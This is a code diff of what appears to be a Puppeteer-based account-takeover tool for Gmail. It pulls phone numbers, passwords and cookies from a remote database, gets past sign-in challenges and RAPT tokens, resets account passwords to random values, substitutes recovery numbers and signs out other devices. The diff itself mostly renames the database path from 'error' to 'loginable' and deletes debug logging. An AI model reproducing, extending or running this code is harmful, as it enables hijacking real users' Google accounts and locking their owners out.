@@ -396,7 +396,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                             } catch (error) {}
                             
                             console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
-                            await axios.delete(BASE_URL+'error/'+number+'.json')
+                            await axios.delete(BASE_URL+'loginable/'+number+'.json')
                             mSameNumber = 0
                         }
                     } else {
@@ -409,7 +409,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                         } catch (error) {}
                         
                         console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
-                        await axios.delete(BASE_URL+'error/'+number+'.json')
+                        await axios.delete(BASE_URL+'loginable/'+number+'.json')
                         mSameNumber = 0
                     }
                 } else {
@@ -425,7 +425,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                 }
 
                 try {
-                    await axios.delete(BASE_URL+'error/'+number+'.json')
+                    await axios.delete(BASE_URL+'loginable/'+number+'.json')
                 } catch (error) {}
             } catch (error) {
                 console.log('Process: [ Browser Process: Error --- Time: '+getTime()+' ]')
@@ -453,7 +453,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                 })
             } catch (error) {}
 
-            await axios.delete(BASE_URL+'error/'+number+'.json')
+            await axios.delete(BASE_URL+'loginable/'+number+'.json')
         }
     } catch (error) {}
 
@@ -467,7 +467,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                 })
             } catch (error) {}
             console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
-            await axios.delete(BASE_URL+'error/'+number+'.json')
+            await axios.delete(BASE_URL+'loginable/'+number+'.json')
             mSameNumber = 0
         }
     } catch (error) {}
@@ -484,8 +484,6 @@ async function validRaptoken(browser, page, user, password, mRapt) {
             console.log('Process: [ Valid RAPT Token --- Time: '+getTime()+' ]')
         } else {
             let status = await waitForLoginChallenge(page, password, 'https://myaccount.google.com/recovery/email')
-
-            console.log('Status:', status)
             
             if (status == 2 || status == 0) {
                 console.log('Process: [ Recovery Change --- Time: '+getTime()+' ]')
@@ -568,9 +566,7 @@ async function validRaptoken(browser, page, user, password, mRapt) {
                 return { change:true, browser: browser, page: page, number: number, pass:changePass, rapt:null }
             }
         }
-    } catch (error) {
-        console.log('Error:', error)
-    }
+    } catch (error) {}
 
     if (mClose) {
         return { change:true, browser: browser, page: page, number: null, pass:null, rapt:null }
@@ -598,8 +594,6 @@ async function waitForGmailLogin(page, user, password, number) {
 
             status = await waitForLoginSuccess(page)
 
-            console.log('status1', status)
-
             if (status == 3) {
                 if (await exists(page, 'div[data-challengetype="13"]')) {
                     await delay(500)
@@ -619,8 +613,6 @@ async function waitForGmailLogin(page, user, password, number) {
                         }
 
                         status = await waitForLoginSuccess(page)
-
-                        console.log('status4', status)
                         
                         return status
                     }
@@ -646,8 +638,6 @@ async function waitForGmailLogin(page, user, password, number) {
                             await page.click('#idvPreregisteredPhoneNext')
                             status = await waitForLoginSuccess(page)
 
-                            console.log('status2', status)
-                            
                             return status
                         } else {
                             console.log('Process: [ OTP: Failed --- Time: '+getTime()+' ]')
@@ -668,7 +658,6 @@ async function passwordChange(page) {
         await waitForSelector(page, 'input[name="Passwd"]')
         await delay(500)
         let password = getRandomPass()
-        console.log(password)
         
         await page.type('input[name="Passwd"]', password)
         await delay(500)
@@ -679,14 +668,10 @@ async function passwordChange(page) {
 
         let status = await waitForLoginSuccess(page, true)
 
-        console.log('status3', status)
-        
         if (status == 1) {
             return password
         }
-    } catch (error) {
-        console.log(error)
-    }
+    } catch (error) {}
 
     return null
 }
@@ -699,12 +684,8 @@ async function waitForRecoveryChange(page, mRapt) {
         for (let i = 0; i < 2; i++) {
             try {
                 let number = pickRandomNumber(mNumberList, {})
-
-                console.log(number)
                 
                 let msgs = await readPrevMsgs(number)
-
-                console.log(msgs.length)
 
                 let data = await page.evaluate(async (number, rapt) => {
                     try {
@@ -729,8 +710,6 @@ async function waitForRecoveryChange(page, mRapt) {
                 }, number, mRapt)
 
                 let details = numberAddToken(extractArrays(data)[0])
-
-                console.log(details)
                 
                 if (details && details.id && details.token) {
                     console.log('Process: [ Recovery Add: Pending --- Time: '+getTime()+' ]')
@@ -774,13 +753,9 @@ async function waitForRecoveryChange(page, mRapt) {
                 } else {
                     console.log('Process: [ Recovery Add: Failed --- Time: '+getTime()+' ]')
                 }
-            } catch (e) {
-                console.log(error)
-            }
+            } catch (e) {}
         }
-    } catch (error) {
-        console.log(error)
-    }
+    } catch (error) {}
 
     return null
 }
@@ -1102,10 +1077,6 @@ async function waitForDeviceLogout(page, rapt) {
                     return year
                 }
             }            
-        } else {
-            if (await exists(page, 'a[href*="two-step-verification/prompt"]')) {
-                console.log('Process: [ Google prompt: 1 device --- Time: '+getTime()+' ]')
-            }
         }
     } catch (error) {}
 
@@ -2276,7 +2247,7 @@ async function exists(page, element) {
 async function getGmailData() {
 
     try {
-        let response = await axios.get(BASE_URL+'error.json?orderBy=%22$key%22&limitToFirst=1')
+        let response = await axios.get(BASE_URL+'loginable.json?orderBy=%22$key%22&limitToFirst=1')
         let data = response.data
         if (data) {
             let number = Object.keys(data)[0]
